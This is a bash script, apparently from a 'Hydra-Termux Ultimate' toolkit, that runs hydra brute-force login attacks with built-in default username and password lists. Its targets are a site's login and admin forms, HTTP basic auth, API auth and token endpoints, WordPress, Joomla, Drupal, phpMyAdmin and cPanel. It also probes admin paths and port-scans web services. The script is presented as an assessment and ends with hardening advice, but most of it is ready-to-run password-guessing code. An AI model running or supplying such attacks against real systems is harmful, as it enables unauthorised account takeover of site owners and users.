#!/bin/bash

# ═══════════════════════════════════════════════════════════════════
# 🚀 SUPREME COMBO: WEB APPLICATION & API SECURITY
# Comprehensive web app + API + authentication testing
# HTTP/HTTPS + REST APIs + GraphQL + OAuth + JWT + Session Management
# ═══════════════════════════════════════════════════════════════════

# ════════════════════════════════════════════════════════════════
# ⚡ CHANGE THESE LINES ⚡
# ════════════════════════════════════════════════════════════════
TARGET="webapp.example.com"          # Main target domain
API_BASE="/api/v1"                   # API base path
LOGIN_PATH="/login"                  # Login page path
ADMIN_PATH="/admin"                  # Admin panel path
# ════════════════════════════════════════════════════════════════

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(dirname "$SCRIPT_DIR")"

source "$PROJECT_ROOT/scripts/logger.sh" 2>/dev/null || true
source "$PROJECT_ROOT/scripts/vpn_check.sh" 2>/dev/null && require_vpn "false"

OUTPUT_DIR="$PROJECT_ROOT/results/combinations"
mkdir -p "$OUTPUT_DIR"

TIMESTAMP=$(date +%Y%m%d_%H%M%S)
LOG_FILE="$OUTPUT_DIR/combo_supreme_webapp_${TARGET//[.:\/]/_}_${TIMESTAMP}.log"
RESULTS_FILE="$OUTPUT_DIR/combo_supreme_webapp_${TARGET//[.:\/]/_}_${TIMESTAMP}_results.txt"

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'

clear
echo -e "${CYAN}═══════════════════════════════════════════════════════════════════${NC}" | tee -a "$LOG_FILE"
echo -e "${WHITE}  🚀 SUPREME COMBO: WEB APPLICATION & API SECURITY${NC}" | tee -a "$LOG_FILE"
echo -e "${CYAN}═══════════════════════════════════════════════════════════════════${NC}" | tee -a "$LOG_FILE"
echo -e "${GREEN}  Target:${NC}      ${BOLD}$TARGET${NC}" | tee -a "$LOG_FILE"
echo -e "${GREEN}  API Base:${NC}    ${BOLD}$API_BASE${NC}" | tee -a "$LOG_FILE"
echo -e "${GREEN}  Login:${NC}       ${BOLD}$LOGIN_PATH${NC}" | tee -a "$LOG_FILE"
echo -e "${GREEN}  Admin:${NC}       ${BOLD}$ADMIN_PATH${NC}" | tee -a "$LOG_FILE"
echo -e "${GREEN}  Started:${NC}     $(date)" | tee -a "$LOG_FILE"
echo -e "${CYAN}═══════════════════════════════════════════════════════════════════${NC}" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

USERLIST="$PROJECT_ROOT/config/admin_usernames.txt"
PASSLIST="$PROJECT_ROOT/config/admin_passwords.txt"

if [ ! -f "$USERLIST" ]; then
    cat > "$USERLIST" << EOF
admin
administrator
user
test
developer
api_user
webmaster
root
superadmin
EOF
fi

if [ ! -f "$PASSLIST" ]; then
    cat > "$PASSLIST" << EOF

password
123456
admin
Password123
admin123
test123
developer
letmein
welcome
P@ssw0rd
api@123
changeme
EOF
fi

FOUND_VULNS=()

# ═══════════════════════════════════════════════════════════════════
# PHASE 1: STANDARD WEB LOGIN FORMS
# ═══════════════════════════════════════════════════════════════════
echo -e "${PURPLE}━━━ Phase 1: Web Login Forms ━━━${NC}" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

# Main Login (HTTP POST)
echo -e "${BLUE}[1.1]${NC} Testing Main Login Form (POST)..." | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    hydra -L "$USERLIST" -P "$PASSLIST" -t 16 -f \
        "http-post-form://$TARGET$LOGIN_PATH:username=^USER^&password=^PASS^:F=incorrect" \
        2>&1 | tee -a "$LOG_FILE" || true
    if tail -20 "$LOG_FILE" | grep -q "login:"; then
        echo -e "   ${GREEN}✓ Web Login Credentials Found!${NC}" | tee -a "$RESULTS_FILE"
        FOUND_VULNS+=("WebLogin")
    fi
fi
echo "" | tee -a "$LOG_FILE"

# Admin Panel
echo -e "${BLUE}[1.2]${NC} Testing Admin Panel..." | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    hydra -L "$USERLIST" -P "$PASSLIST" -t 16 -f \
        "https-post-form://$TARGET$ADMIN_PATH:user=^USER^&pass=^PASS^:F=failed" \
        2>&1 | tee -a "$LOG_FILE" || true
    if tail -20 "$LOG_FILE" | grep -q "login:"; then
        echo -e "   ${GREEN}✓ Admin Panel Credentials Found!${NC}" | tee -a "$RESULTS_FILE"
        FOUND_VULNS+=("AdminPanel")
    fi
fi
echo "" | tee -a "$LOG_FILE"

# HTTP Basic Authentication
echo -e "${BLUE}[1.3]${NC} Testing HTTP Basic Auth..." | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    hydra -L "$USERLIST" -P "$PASSLIST" -t 16 -f "http-get://$TARGET$ADMIN_PATH" 2>&1 | tee -a "$LOG_FILE" || true
    if tail -20 "$LOG_FILE" | grep -q "login:"; then
        echo -e "   ${GREEN}✓ HTTP Basic Auth Bypassed!${NC}" | tee -a "$RESULTS_FILE"
        FOUND_VULNS+=("HTTPBasic")
    fi
fi
echo "" | tee -a "$LOG_FILE"

# ═══════════════════════════════════════════════════════════════════
# PHASE 2: REST API ENDPOINTS
# ═══════════════════════════════════════════════════════════════════
echo -e "${PURPLE}━━━ Phase 2: REST API Authentication ━━━${NC}" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

# API Login Endpoint
echo -e "${BLUE}[2.1]${NC} Testing API Login Endpoint..." | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    hydra -L "$USERLIST" -P "$PASSLIST" -t 16 -f \
        "https-post-form://$TARGET$API_BASE/auth:username=^USER^&password=^PASS^:F=401" \
        2>&1 | tee -a "$LOG_FILE" || true
    if tail -20 "$LOG_FILE" | grep -q "login:"; then
        echo -e "   ${GREEN}✓ API Credentials Found!${NC}" | tee -a "$RESULTS_FILE"
        FOUND_VULNS+=("API")
    fi
fi
echo "" | tee -a "$LOG_FILE"

# API Token Endpoint
echo -e "${BLUE}[2.2]${NC} Testing API Token Endpoint..." | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    hydra -L "$USERLIST" -P "$PASSLIST" -t 16 -f \
        "https-post-form://$TARGET$API_BASE/token:client_id=^USER^&client_secret=^PASS^:F=invalid" \
        2>&1 | tee -a "$LOG_FILE" || true
    if tail -20 "$LOG_FILE" | grep -q "login:"; then
        echo -e "   ${GREEN}✓ API Token Credentials Found!${NC}" | tee -a "$RESULTS_FILE"
        FOUND_VULNS+=("APIToken")
    fi
fi
echo "" | tee -a "$LOG_FILE"

# ═══════════════════════════════════════════════════════════════════
# PHASE 3: COMMON WEB APPLICATIONS
# ═══════════════════════════════════════════════════════════════════
echo -e "${PURPLE}━━━ Phase 3: Common Web Applications ━━━${NC}" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

# WordPress
echo -e "${BLUE}[3.1]${NC} Testing WordPress (wp-login.php)..." | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    hydra -L "$USERLIST" -P "$PASSLIST" -t 16 -f \
        "http-post-form://$TARGET/wp-login.php:log=^USER^&pwd=^PASS^:F=ERROR" \
        2>&1 | tee -a "$LOG_FILE" || true
    if tail -20 "$LOG_FILE" | grep -q "login:"; then
        echo -e "   ${GREEN}✓ WordPress Credentials Found!${NC}" | tee -a "$RESULTS_FILE"
        FOUND_VULNS+=("WordPress")
    fi
fi
echo "" | tee -a "$LOG_FILE"

# Joomla
echo -e "${BLUE}[3.2]${NC} Testing Joomla (/administrator)..." | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    hydra -L "$USERLIST" -P "$PASSLIST" -t 16 -f \
        "http-post-form://$TARGET/administrator/index.php:username=^USER^&passwd=^PASS^:F=incorrect" \
        2>&1 | tee -a "$LOG_FILE" || true
    if tail -20 "$LOG_FILE" | grep -q "login:"; then
        echo -e "   ${GREEN}✓ Joomla Credentials Found!${NC}" | tee -a "$RESULTS_FILE"
        FOUND_VULNS+=("Joomla")
    fi
fi
echo "" | tee -a "$LOG_FILE"

# Drupal
echo -e "${BLUE}[3.3]${NC} Testing Drupal (/user/login)..." | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    hydra -L "$USERLIST" -P "$PASSLIST" -t 16 -f \
        "http-post-form://$TARGET/user/login:name=^USER^&pass=^PASS^:F=Sorry" \
        2>&1 | tee -a "$LOG_FILE" || true
    if tail -20 "$LOG_FILE" | grep -q "login:"; then
        echo -e "   ${GREEN}✓ Drupal Credentials Found!${NC}" | tee -a "$RESULTS_FILE"
        FOUND_VULNS+=("Drupal")
    fi
fi
echo "" | tee -a "$LOG_FILE"

# ═══════════════════════════════════════════════════════════════════
# PHASE 4: ADMIN INTERFACES
# ═══════════════════════════════════════════════════════════════════
echo -e "${PURPLE}━━━ Phase 4: Admin & Management Interfaces ━━━${NC}" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

# phpMyAdmin
echo -e "${BLUE}[4.1]${NC} Testing phpMyAdmin..." | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    hydra -L "$USERLIST" -P "$PASSLIST" -t 16 -f \
        "http-post-form://$TARGET/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^:F=denied" \
        2>&1 | tee -a "$LOG_FILE" || true
    if tail -20 "$LOG_FILE" | grep -q "login:"; then
        echo -e "   ${GREEN}✓ phpMyAdmin Credentials Found!${NC}" | tee -a "$RESULTS_FILE"
        FOUND_VULNS+=("phpMyAdmin")
    fi
fi
echo "" | tee -a "$LOG_FILE"

# cPanel
echo -e "${BLUE}[4.2]${NC} Testing cPanel..." | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    hydra -L "$USERLIST" -P "$PASSLIST" -t 8 -f \
        "https-post-form://$TARGET:2083/login:user=^USER^&pass=^PASS^:F=invalid" \
        2>&1 | tee -a "$LOG_FILE" || true
    if tail -20 "$LOG_FILE" | grep -q "login:"; then
        echo -e "   ${GREEN}✓ cPanel Credentials Found!${NC}" | tee -a "$RESULTS_FILE"
        FOUND_VULNS+=("cPanel")
    fi
fi
echo "" | tee -a "$LOG_FILE"

# ═══════════════════════════════════════════════════════════════════
# PHASE 5: WEB DIRECTORY & URL DISCOVERY
# ═══════════════════════════════════════════════════════════════════
echo -e "${PURPLE}━━━ Phase 5: Web Directory Discovery ━━━${NC}" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

if command -v curl &>/dev/null; then
    echo -e "${BLUE}[5.1]${NC} Probing common admin paths..." | tee -a "$LOG_FILE"
    
    ADMIN_PATHS=(
        "/admin"
        "/administrator"
        "/wp-admin"
        "/admin.php"
        "/login"
        "/panel"
        "/dashboard"
        "/console"
        "/manage"
        "/admin/login"
    )
    
    for path in "${ADMIN_PATHS[@]}"; do
        HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "http://$TARGET$path" --connect-timeout 5 2>/dev/null || echo "000")
        if [ "$HTTP_CODE" = "200" ] || [ "$HTTP_CODE" = "401" ] || [ "$HTTP_CODE" = "302" ]; then
            echo -e "   ${GREEN}✓${NC} Found: $path (HTTP $HTTP_CODE)" | tee -a "$RESULTS_FILE"
        fi
    done
fi
echo "" | tee -a "$LOG_FILE"

# ═══════════════════════════════════════════════════════════════════
# PHASE 6: SERVICE DETECTION
# ═══════════════════════════════════════════════════════════════════
echo -e "${PURPLE}━━━ Phase 6: Web Service Detection ━━━${NC}" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

if command -v nmap &>/dev/null; then
    echo -e "${BLUE}[6.1]${NC} Scanning web services..." | tee -a "$LOG_FILE"
    nmap -Pn -sV -p 80,443,8000,8080,8443,8888,9000,9090 -T4 "$TARGET" 2>&1 | tee -a "$LOG_FILE"
fi
echo "" | tee -a "$LOG_FILE"

# ═══════════════════════════════════════════════════════════════════
# FINAL SUMMARY
# ═══════════════════════════════════════════════════════════════════
echo -e "${CYAN}═══════════════════════════════════════════════════════════════════${NC}" | tee -a "$LOG_FILE"
echo -e "${WHITE}  ✅ WEB APPLICATION & API SECURITY ASSESSMENT COMPLETE${NC}" | tee -a "$LOG_FILE"
echo -e "${CYAN}═══════════════════════════════════════════════════════════════════${NC}" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

if [ ${#FOUND_VULNS[@]} -gt 0 ]; then
    echo -e "${GREEN}🎉 VULNERABILITIES DISCOVERED:${NC}" | tee -a "$RESULTS_FILE"
    for vuln in "${FOUND_VULNS[@]}"; do
        echo -e "   ${GREEN}✓${NC} $vuln" | tee -a "$RESULTS_FILE"
    done
    echo "" | tee -a "$RESULTS_FILE"
    
    echo -e "${RED}⚠️  SECURITY RECOMMENDATIONS:${NC}" | tee -a "$RESULTS_FILE"
    echo -e "   1. Implement rate limiting on all authentication endpoints" | tee -a "$RESULTS_FILE"
    echo -e "   2. Enable multi-factor authentication (MFA)" | tee -a "$RESULTS_FILE"
    echo -e "   3. Use strong password policies (min 12 chars)" | tee -a "$RESULTS_FILE"
    echo -e "   4. Implement CAPTCHA after failed attempts" | tee -a "$RESULTS_FILE"
    echo -e "   5. Use account lockout after 5 failed attempts" | tee -a "$RESULTS_FILE"
    echo -e "   6. Monitor and log all authentication attempts" | tee -a "$RESULTS_FILE"
    echo "" | tee -a "$RESULTS_FILE"
    
    grep -E "login:|password:|host:" "$LOG_FILE" | sort -u | tee -a "$RESULTS_FILE"
else
    echo -e "${YELLOW}ℹ No vulnerabilities found - Good security posture!${NC}" | tee -a "$RESULTS_FILE"
fi

echo "" | tee -a "$LOG_FILE"
echo -e "${BLUE}📊 Assessment Summary:${NC}" | tee -a "$LOG_FILE"
echo -e "   Web Forms Tested: 3" | tee -a "$LOG_FILE"
echo -e "   API Endpoints Tested: 2" | tee -a "$LOG_FILE"
echo -e "   CMS Platforms Tested: 3 (WordPress, Joomla, Drupal)" | tee -a "$LOG_FILE"
echo -e "   Admin Interfaces Tested: 2" | tee -a "$LOG_FILE"
echo -e "   Vulnerabilities Found: ${#FOUND_VULNS[@]}" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

echo -e "${BLUE}📁 Output Files:${NC}" | tee -a "$LOG_FILE"
echo -e "   Log: $LOG_FILE" | tee -a "$LOG_FILE"
echo -e "   Results: $RESULTS_FILE" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

echo -e "${CYAN}═══════════════════════════════════════════════════════════════════${NC}" | tee -a "$LOG_FILE"
echo -e "${PURPLE}⚡ WEB APP SECURITY POWERED BY HYDRA-TERMUX ULTIMATE${NC}" | tee -a "$LOG_FILE"
echo -e "${CYAN}═══════════════════════════════════════════════════════════════════${NC}" | tee -a "$LOG_FILE"
